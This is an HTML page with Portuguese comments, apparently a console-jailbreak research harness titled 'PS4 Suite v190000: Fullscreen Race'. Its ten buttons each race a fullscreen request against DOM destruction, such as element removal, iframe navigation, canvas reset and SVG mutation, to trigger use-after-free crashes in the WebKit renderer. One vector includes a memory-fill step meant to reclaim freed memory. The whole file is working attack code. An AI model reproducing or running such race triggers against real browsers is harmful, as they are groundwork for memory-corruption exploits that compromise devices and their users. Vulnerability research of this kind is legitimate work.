
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v190000: Fullscreen Race</title>
<style>
    body { background-color: #000; color: #0f0; font-family: sans-serif; padding: 10px; text-align: center; }
    h1 { margin: 10px 0; font-size: 24px; color: #fff; }
    
    /* Área de Status sempre visível */
    #status { 
        border: 2px solid #fff; background: #222; color: #ff0; 
        padding: 10px; margin-bottom: 20px; font-weight: bold; font-size: 18px;
    }

    /* Botões Grandes para fácil clique */
    button { 
        display: block; width: 100%; padding: 20px; margin: 10px 0; 
        background: #900; color: #fff; border: 2px solid #f00; 
        font-size: 20px; font-weight: bold; cursor: pointer;
        text-transform: uppercase;
    }
    button:active { background: #f00; border-color: #fff; }

    /* Elementos invisíveis/alvos */
    .trap { width: 10px; height: 10px; background: red; position: absolute; top: -1000px; }
</style>
</head>
<body>

<h1>v190000: FULLSCREEN RACE</h1>
<div id="status">CLIQUE NO BOTÃO PARA INICIAR A CORRIDA</div>

<button onclick="race(f01)">01. Fullscreen -> Remove Element (UAF)</button>
<button onclick="race(f02)">02. Fullscreen -> Iframe Navigation</button>
<button onclick="race(f03)">03. Fullscreen -> Canvas Context Loss</button>
<button onclick="race(f04)">04. Fullscreen -> Display: None (Layout)</button>
<button onclick="race(f05)">05. Fullscreen -> SVG ViewBox Mutation</button>
<button onclick="race(f06)">06. Fullscreen -> Table Row Delete</button>
<button onclick="race(f07)">07. Fullscreen -> Video Source Abort</button>
<button onclick="race(f08)">08. Fullscreen -> CSS Transform Matrix</button>
<button onclick="race(f09)">09. Fullscreen -> ScrollIntoView Conflict</button>
<button onclick="race(f10)">10. Fullscreen -> Recursive Request</button>

<script>
    const S = document.getElementById('status');

    function race(vectorFunc) {
        S.innerText = "1. PREPARANDO ARMADILHA...";
        S.style.background = "#222";
        
        // Cria o elemento alvo dinamicamente
        const target = document.createElement('div');
        target.className = 'trap';
        target.innerHTML = "<h1>ALVO</h1><p>Destruição Iminente</p>";
        // Garante que o elemento seja visível para o renderizador (senão fullscreen falha)
        target.style.top = "0px"; 
        target.style.position = "relative";
        document.body.appendChild(target);

        // Prepara o vetor específico
        vectorFunc(target);

        S.innerText = "2. SOLICITANDO FULLSCREEN...";
        
        // Tenta métodos padrão e prefixados (PS4 usa webkit)
        const req = target.requestFullscreen || target.webkitRequestFullscreen || target.mozRequestFullScreen;

        if (req) {
            req.call(target); // Ação síncrona do usuário
            
            // AQUI ESTÁ A CORRIDA
            // O navegador começa a animar para tela cheia.
            // Nós agendamos a destruição para 50ms depois.
            // Se o tempo for exato, o renderizador tenta desenhar um objeto morto.
            setTimeout(() => {
                S.innerText = "3. DETONANDO (BOOM)!";
                S.style.background = "#f00";
                
                if (target._kill) {
                    target._kill();
                } else {
                    target.remove();
                }
                
                // Limpeza pós-teste se não crashou
                setTimeout(() => {
                    S.innerText = "FALHA: NAVEGADOR SOBREVIVEU.";
                    S.style.background = "#050";
                }, 1000);
            }, 50); // Ajuste fino: 10ms a 100ms é a zona de perigo
        } else {
            S.innerText = "ERRO: Fullscreen API não suportada.";
        }
    }

    // =================================================================
    // 01. Remove Element (UAF Clássico)
    // =================================================================
    function f01(el) {
        el.style.backgroundColor = "red";
        el._kill = () => {
            // Remove o elemento que está virando tela cheia
            el.remove();
            // Tenta ocupar a memória imediatamente
            const fill = new Array(1000).fill(1.1);
        };
    }

    // =================================================================
    // 02. Iframe Navigation (Context Destroy)
    // =================================================================
    function f02(el) {
        const ifr = document.createElement('iframe');
        ifr.src = "about:blank";
        el.appendChild(ifr);
        el._kill = () => {
            // Navegar o iframe enquanto o pai entra em fullscreen
            ifr.src = "javascript:'CRASH'";
            setTimeout(() => el.remove(), 10);
        };
    }

    // =================================================================
    // 03. Canvas Context Loss
    // =================================================================
    function f03(el) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        ctx.fillRect(0,0,100,100);
        el.appendChild(c);
        
        el._kill = () => {
            // Zera o tamanho do canvas (reseta o contexto GPU)
            c.width = 0;
            c.height = 0;
            c.remove();
        };
    }

    // =================================================================
    // 04. Display: None (Render Tree Thrashing)
    // =================================================================
    function f04(el) {
        el.style.display = "block";
        el._kill = () => {
            // Elementos display:none não podem estar em fullscreen.
            // O motor tem que abortar a renderização abruptamente.
            el.style.display = "none";
            // Força reflow
            document.body.offsetTop;
        };
    }

    // =================================================================
    // 05. SVG ViewBox Mutation
    // =================================================================
    function f05(el) {
        el.innerHTML = `<svg viewBox="0 0 100 100"><rect width="100" height="100" fill="blue"/></svg>`;
        el._kill = () => {
            const svg = el.firstChild;
            // Valores inválidos durante renderização
            svg.setAttribute("viewBox", "0 0 0 0");
            el.innerHTML = "";
        };
    }

    // =================================================================
    // 06. Table Row Delete (Layout Complexo)
    // =================================================================
    function f06(el) {
        const t = document.createElement('table');
        const r = t.insertRow();
        const c = r.insertCell();
        c.innerText = "EXPAND";
        el.appendChild(t);
        
        el._kill = () => {
            // Deletar linha de tabela força recálculo pesado de layout
            t.deleteRow(0);
            t.remove();
        };
    }

    // =================================================================
    // 07. Video Source Abort
    // =================================================================
    function f07(el) {
        const v = document.createElement('video');
        // Vídeo grande para engajar o player nativo
        v.src = "blob:null"; 
        el.appendChild(v);
        
        el._kill = () => {
            v.removeAttribute("src");
            v.load(); // Força reset do player
            v.remove();
        };
    }

    // =================================================================
    // 08. CSS Transform Matrix (GPU Math)
    // =================================================================
    function f08(el) {
        el.style.transition = "all 1s";
        el._kill = () => {
            // Aplica matriz singular/inválida durante a animação de fullscreen
            el.style.transform = "matrix(0,0,0,0,0,0)";
            el.remove();
        };
    }

    // =================================================================
    // 09. ScrollIntoView Conflict
    // =================================================================
    function f09(el) {
        // Cria conteúdo longo
        el.style.height = "2000px";
        el._kill = () => {
            // Tenta rolar para um elemento que está sendo removido
            el.scrollIntoView();
            el.remove();
        };
    }

    // =================================================================
    // 10. Recursive Request (Stack Smash)
    // =================================================================
    function f10(el) {
        el._kill = () => {
            // Pede fullscreen de novo dentro da transição
            if(el.webkitRequestFullscreen) {
                try { el.webkitRequestFullscreen(); } catch(e){}
            }
            el.remove();
        };
    }
</script>

</body>
</html>
